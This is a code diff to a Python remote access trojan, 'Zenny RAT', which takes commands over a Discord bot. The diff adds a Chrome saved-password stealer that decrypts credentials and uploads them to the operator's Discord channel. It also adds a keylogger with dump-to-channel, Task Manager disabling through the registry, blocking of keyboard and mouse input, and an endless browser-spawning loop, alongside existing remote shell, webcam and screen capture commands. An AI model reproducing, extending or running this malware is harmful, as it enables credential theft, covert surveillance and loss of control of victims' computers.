@@ -1,18 +1,24 @@
 # synthetic#2368
 # dm me for updates on project
 # https://t.me/syntheticlol
+##########################################
 import os
 import cv2
 import discord
+import sqlite3
 import asyncio
 import ctypes
+import json
 import psutil
+import win32crypt
+import base64
 import requests
 import datetime
 import platform
 import numpy as np
 import subprocess
 import webbrowser
+import logging
 import pyautogui
 import socket
 import pyperclip
@@ -22,12 +28,15 @@ import sys
 import shutil
 from PIL import ImageGrab
 from io import BytesIO
-from discord import File
 from discord.ext import commands
+from discord import File, Embed
+from discord import utils
+from mss import mss
+from pynput.keyboard import Key, Listener
+##########################################
 
 intents = discord.Intents.all()
 bot = commands.Bot(command_prefix='.', intents=intents, help_command=None)
-
 
 #### HERES YOUR CONFIG ####
 config = { #### HERES YOUR CONFIG ####
@@ -47,7 +56,7 @@ async def errorerror(ctx, error):
 @bot.event
 async def on_ready():
     print(f'Logged in as {bot.user.name}')
-    await bot.change_presence(activity=discord.Game(name="Zenny RAT Version 0.1 | made by synthetic#3681"))
+    await bot.change_presence(activity=discord.Game(name="Zenny RAT Version 0.5 | made by synthetic#3681"))
 
     server = bot.get_guild(int(config['server_id']))
     if server:
@@ -68,7 +77,7 @@ async def on_ready():
 
         embed = discord.Embed(
             title="Zenny Rat Connected" if session else "Zenny Rat Reconnected",
-            description=f"Your Session Key is {pcn} :white_check_mark:",
+            description=f"Your Session Key is {pcn} :white_check_mark:\n**Use .help for Commands**",
             color=discord.Color.green()
         )
         await session.send(embed=embed) if session else None
@@ -86,22 +95,16 @@ Remote Desktop:
   .record <sessionkey>: Records the user's screen for 30 seconds
   .webcam <sessionkey>: Captures a picture from the user's webcam
 
-------------------------------------------------------------------------------------------
-
 Information Gathering:
 
   .time <sessionkey>: Retrieves the user's date and time
   .Ipinfo <sessionkey>: Retrieves the user's IP information
-  .sysinfo <sessionkey>: Retrieves the user's system information
+  .sysinfo <sessionkey>: Retrieves the user's system information#
+  .cpass <sesisonkey>: Obtains Targets Chrome Passwords
   .usage <sessionkey>: Tells you the users disk and cpu usage
-
-------------------------------------------------------------------------------------------
-
-Remote Shell Commands:
-
-  .shell <sessionkey> <command>: Executes a command on the victim's computer
-
-------------------------------------------------------------------------------------------
+  .startkeylogger <sesisonkey>: Logs Key Strokes 
+  .stopkeylogger <seesionnkey>: Stops KeyStrokes
+  .dumpkeylogger <sessionkey>: Dumpskey log.txt from target machines
 
 File Management:
 
@@ -109,16 +112,17 @@ File Management:
   .getdownloads <sessionkey>: Gets all Users files in downloads folder
   .download <sessionkey>: Can download any file in their downloads folder
 
-------------------------------------------------------------------------------------------
-
 System Control:
 
   .restart <sessionkey>: Restarts the user's computer
   .shutdown <sessionkey>: Shuts down the user's computer
   .screenoff <sessionkey>: Turns off victims monitor
   .screenon <sessionkey>: Turns Victims monitor back on
+  .dismgr <sessionkey>: Disables Targets Task Manager
+  .enablemgr <sessionkey>: Enable Targets Task Manager
+  .blockin <sessionkey>: Blocks Targets Keyboard / Mouse Input
+  .unblockin <sessionkey>: Un-Blocks Targets Keyboard / Mouse Input
 
-------------------------------------------------------------------------------------------
 ```
 """
     message2 = """```
@@ -140,6 +144,21 @@ Troll Commands:
   .rickroll <sessionkey>: rickrolls their computer for 30 seconds and they cannot escape
   .music <sessionkey> <file_attachment>: plays music on their computer
   .bluescreen <sessionkey>: COMING SOON.
+  .winspam <sessionkey>: Spams A Browser Windows [warning cant stop it]
+
+------------------------------------------------------------------------------------------
+```
+"""
+    message3 = """```
+------------------------------------Example Shell Commands-----------------------------------------------
+
+Remote Shell Commands:
+
+  .shell <sessionkey> <command>: Executes a command on the victim's computer
+        └ getmac [ Obtain Machines Mac Address's ]
+          └ ipconfig [ Obtain Machines Ip Configuration ]
+            └ tracert [ track the pathway a packet takes from a source IP to the destination address ]
+              └ netstat [ Provides list of current Open Ports ]
 
 ------------------------------------------------------------------------------------------
 ```
@@ -147,17 +166,181 @@ Troll Commands:
 
     await ctx.send(message)
     await ctx.send(message2)
+    await ctx.send(message3)
+
+
+@bot.command() # Updated Command Using mss lib for ease of Screen shotting
+async def screenshot(ctx, seshn: str):
+    session = sessions.get(seshn)
+
+    with mss() as sct:
+        sct.shot(output=os.path.join(os.getenv('TEMP') + "\\monitor.png"))
+    file = discord.File(os.path.join(os.getenv('TEMP') + "\\monitor.png"), filename="monitor.png")
+    await ctx.send("[*] Command successfully executed", file=file)
+    os.remove(os.path.join(os.getenv('TEMP') + "\\monitor.png"))
+
+@bot.command() # New Command
+async def dismgr(ctx, seshn: str):
+    session = sessions.get(seshn)
+    try:
+        os.system("REG add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 0 /f")
+        await ctx.send(f"**[ INFO ] Successfully Disabled {seshn} Task Manager** :white_check_mark:")
+    except Exception as e:
+        await ctx.send(f"**[ ERROR ] Unable to Disable task Manager Due to the following Error**\n\n```js{e}```")
+
+@bot.command() # New Command
+async def enablemgr(ctx, seshn: str):
+    session = sessions.get(seshn)
+    try:
+        os.system("REG add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f")
+        await ctx.send(f"**[ INFO ] Successfully Enabled {seshn} Task Manager** :white_check_mark:")
+    except Exception as e:
+        await ctx.send(f"**[ ERROR ] Unable to Enable task Manager Due to the following Error**\n\n```js{e}```")
+
+
+@bot.command() # New Command
+async def blockin(ctx, seshn: str):
+    session = sessions.get(seshn)
+    is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
+    if is_admin == True:
+        ok = windll.user32.BlockInput(True)
+        await ctx.send(f"[ INFO ] Successfully Blocked {seshn} Mouse and Keyboard Input :white_check_mark:")
+    else:
+        await ctx.send(f"[ ERROR ] Failed To Block {seshn}'s Mouse And Keyboard Input")
+
+@bot.command()
+async def unblockin(ctx, seshn: str):
+    session = sessions.get(seshn)
+    is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
+    if is_admin == True:
+        ok = windll.user32.BlockInput(False)
+        await ctx.send(f"[ INFO ] Successfully Un-Blocked {seshn} Mouse and Keyboard Input :white_check_mark:")
+    else:
+        await ctx.send(f"[ ERROR ] Failed To Un-Block {seshn}'s Mouse And Keyboard Input")
+
+@bot.command() 
+async def cpass(ctx, seshn: str):
+    session = sessions.get(seshn)
+    def chrometime(ch) ->str:
+        return str(datetime.datetime(1601,1,1) + datetime.timedelta(microseconds=ch))
+            
+    def encryption_key():
+        localsp = os.path.join(os.environ["USERPROFILE"],
+                                "AppData", "Local", "Google", "Chrome",
+                                "User Data", "Local State")
+        with open(localsp, "r", encoding="utf-8") as f:
+            ls = f.read()
+            ls = json.loads(ls)
+            
+        key = base64.b64decode(ls["os_crypt"]["encrypted_key"])
+        key = key[5:]
+        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
+        
+    def decrypt_password(pw, key) -> str:
+        try:
+            iv = pw[3:15]
+            password = pw[15:]
+            cipher = AES.new(key, AES.MODE_GCM, iv)
+            return cipher.decrypt(password)[:-16].decode()
+        except:
+            try:
+                return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
+            except:
+                return ""
+                
+    def main():
+        temp = os.getenv("TEMP")
+        pwpath = f"{temp}\\{os.getlogin()}-GooglePasswords.txt"
+        if os.path.exists(pwpath):
+            os.remove(pwpath)
+        with open(pwpath, "a")as ddd:
+            key = encryption_key()
+            db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
+                                    "Google", "Chrome", "User Data", "default", "Login Data")
+            filename = f"{temp}\\ChromeData.db"
+            shutil.copyfile(db_path, filename)
+            db = sqlite3.connect(filename)
+            cursor = db.cursor()
+            cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
+            for row in cursor.fetchall():
+                origin_url = row[0]
+                action_url = row[1]
+                username = row[2]
+                password = decrypt_password(row[3], key)
+                date_created = row[4]
+                date_last_used = row[5]        
+                if username or password:
+                    ddd.write(f"Origion URL: {origin_url}\nAction URL: {action_url}\nUsername: {username}\nPassword: {password}\nDate Last Used: {str(chrometime(date_last_used))}\nDate Created: {str(chrometime(date_created))}\n")
+                else:
+                    continue
+            cursor.close()
+            db.close()
+            try:
+                os.remove(filename)
+            except:
+                pass
+                
+    main()
+    
+    temp = os.getenv("TEMP")
+    
+    file = discord.File(f"{temp}\\{os.getlogin()}-GooglePasswords.txt", f"{os.getlogin()}-GooglePass.txt")
+    await ctx.send(f"{os.getlogin()}'s Google Passwords:\n", file=file)
+
 
 
 @bot.command()
-async def screenshot(ctx, seshn: str):
+async def winspam(ctx, seshn: str):
     session = sessions.get(seshn)
-    if session:
-        screenshot = pyautogui.screenshot()
-        screenshot.save(f'{seshn}.png')
-        await ctx.send(f"Screenshot", file=discord.File(f'{seshn}.png'))
-    else:
-        pass
+    embed = discord.Embed(
+        title=f'[!] Commands : .winspam on {seshn} Has Been Executed Successfully ',
+        description=f'[!!] Warning This Cannot Be stopped Untill PC has Crashed or Shutdown',
+        color=discord.Color.green()
+    )
+    await ctx.send(embed=embed)
+    while True:
+        os.startfile("chrome.exe")
+
+@bot.command() 
+async def startkeylogger(ctx):
+    temp = os.getenv("TEMP")
+    log_file_path = os.path.join(os.getenv('TEMP'), "key_log.txt")
+    logging.basicConfig(filename=log_file_path, level=logging.DEBUG, format='%(asctime)s: %(message)s')
+
+    sentence = ""
+    def keylog():
+        nonlocal sentence
+        def on_press(key):
+            nonlocal sentence
+            if key == Key.enter:
+                logging.info(sentence)
+                sentence = ""
+            else:
+                sentence += str(key) + " "
+
+        with Listener(on_press=on_press) as listener:
+            listener.join()
+
+    import threading
+    global test
+    test = threading.Thread(target=keylog)
+    test._running = True
+    test.daemon = True
+    test.start()
+    await ctx.send("[*] Keylogger successfully started")
+
+@bot.command()
+async def stopkeylogger(ctx):
+    import os
+    test._running = False
+    await ctx.send("[*] Keylogger successfully stopped")
+
+@bot.command()
+async def dumpkeylogger(ctx):
+    temp = os.getenv("TEMP")
+    file_keys = os.path.join(os.getenv("TEMP") + "\\key_log.txt")
+    file = discord.File(file_keys, filename=file_keys)
+    await ctx.send(f"[*] Here Are the key Strokes", file=file)
 
 @bot.command()
 async def time(ctx, seshn: str):
@@ -178,7 +361,7 @@ async def ipinfo(ctx, seshn: str):
         response = requests.get(url)
         data = response.json()
 
-        embed = discord.Embed(title="Xen Rat - IP LOG", description="IP INFO", color=discord.Color.purple())
+        embed = discord.Embed(title="Zenny Rat - IP LOG", description="IP INFO", color=discord.Color.purple())
         embed.add_field(name=":globe_with_meridians: IP", value=f"```{data['ip']}```", inline=False)
         embed.add_field(name=":house: City", value=f"```{data['city']}```", inline=True)
         embed.add_field(name=":map: Region", value=f"```{data['region']}```", inline=True)
@@ -350,7 +533,7 @@ async def usage(ctx, seshn: str):
 async def upload(ctx, seshn: str, filel: str):
     session = sessions.get(seshn.lower())
     if session:
-        if not filel.startswith("https://cdn.discordapp.com/attachments/"):
+        if not filel.startswith("https://cdn.discordapp.com"):
             await ctx.send("Invalid link. It must be a Discord attachment download link.")
             return
         
@@ -462,7 +645,7 @@ async def fp(ctx, seshn: str):
 async def rickroll(ctx, seshn):
     session = sessions.get(seshn.lower())
     if session:
-        videou = "https://cdn.discordapp.com/attachments/1113634742731026432/1113644870570090547/Rick_Astley_-_Never_Gonna_Give_You_Up_Official_Music_Video.mp4"
+        videou = ""
         response = requests.get(videou)
         with open('video.mp4', 'wb') as file:
             file.write(response.content)
@@ -526,4 +709,3 @@ async def startup(ctx, seshn):
         pass
 
 bot.run(config['token'])
-
